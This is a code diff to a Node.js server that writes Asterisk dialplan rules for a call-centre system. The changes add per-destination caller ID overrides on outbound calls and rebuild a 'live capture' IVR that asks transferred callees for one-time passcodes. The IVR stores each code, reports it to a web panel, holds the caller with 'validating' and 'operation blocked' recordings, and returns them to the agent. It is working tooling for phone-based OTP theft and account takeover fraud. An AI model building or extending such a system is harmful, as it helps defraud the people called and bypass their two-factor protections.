@@ -645,20 +645,29 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
-  dialplanContent += ` same => n,Set(AGENT_PARSED=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_PARSED}" != ""]?\${AGENT_PARSED}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${CALLERID(num)}" != ""]?\${CALLERID(num)}:1002)})})})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-  dialplanContent += ` same => n,NoOp(Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
   dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
-  dialplanContent += ` same => n,Set(AGENT_PARSED=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_PARSED}" != ""]?\${AGENT_PARSED}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${CALLERID(num)}" != ""]?\${CALLERID(num)}:1002)})})})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
   dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
@@ -681,38 +690,48 @@ function generateCleanDialplanConf(
 
   dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
   dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
-  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1)\n`;
   dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
-  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
-  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=1\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/1\${EXTEN})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=1\${EXTEN})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `; 5. Regla Saliente Universal (Cualquier longitud)\n`;
   dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
-  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += `[from-trunk]\n`;
@@ -721,42 +740,106 @@ function generateCleanDialplanConf(
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
-  dialplanContent += `; Mensaje: "Por favor digite su codigo seguido de la tecla de numero (#)"\n`;
+  dialplanContent += `; Espera validación del asesor antes de retornar la llamada\n`;
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `[ivr-captura-vivo]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO: \${TARGET_DEST} ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1002)})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})\n`;
-  dialplanContent += ` ; Buscar audio configurado para la extension 7777\n`;
-  dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+
+  dialplanContent += ` ; Determinar audios para la extension 7777\n`;
+  dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/default_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/digite_token_6_digitos))\n`;
-  dialplanContent += ` same => n,NoOp(Reproduciendo audio de bienvenida en 7777: \${AUDIO_7777})\n`;
-  dialplanContent += ` ; Read reproduce el audio y captura digitos hasta presionar '#' o 8 digitos\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},8,,2,15)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,beep,8,,2,10)\n`;
-  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
 
-  dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
+
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
+
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
+
+  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
+
+  dialplanContent += ` ; Bucle de solicitud del codigo OTP\n`;
+  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_7777} ===)\n`;
+  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},10,,2,15)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
+
+  dialplanContent += ` ; Si tras 2 intentos no marca nada, devolver la llamada al agente en lugar de colgar\n`;
+  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += ` ; Digitos capturados (minimo 4 digitos)\n`;
+  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
+
+  dialplanContent += ` ; PASO DE ESPERA: Locucion 'Un momento por favor, estamos validando...'\n`;
+  dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-7777] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
+  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+
+  dialplanContent += ` ; BUCLE INTELIGENTE: Esperando decision del asesor en la interfaz web (Valido o Invalido)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
+  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
+  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
+  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CURRENT_STATUS}" = ""]?Set(CURRENT_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/45 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 45]?codigo_aprobado)\n`;
+
+  dialplanContent += ` ; Cada 5 segundos un breve tono para mantener canal abierto y calmar al cliente\n`;
+  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
+
+  dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Locucion de exito y reconecta con el asesor\n`;
+  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-7777] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL AGENTE \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL AGENTE \${FINAL_AGENT} ===)\n`;
-  dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
-  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` ; RAMA RECHAZADO: Asesor marco INVALIDO en la web -> Locucion de error y vuelve a pedir el codigo\n`;
+  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-7777] TOKEN INVALIDO DETECTADO -> REINTENTANDO ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
+  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
@@ -1267,14 +1350,28 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Answer()\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 7777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
     dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
     dialplanContent += `exten => 777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 777 ===)\n`;
     dialplanContent += ` same => n,Answer()\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${DB(last_agent_call/\${TARGET_DEST})})})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Cliente: \${TARGET_DEST} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
     dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
     dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
@@ -1297,7 +1394,11 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
     dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
@@ -1321,7 +1422,12 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; 4. Regla Saliente 10 digitos (antepone 1)\n`;
     dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=1\${EXTEN})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/1\${EXTEN})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=1\${EXTEN})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
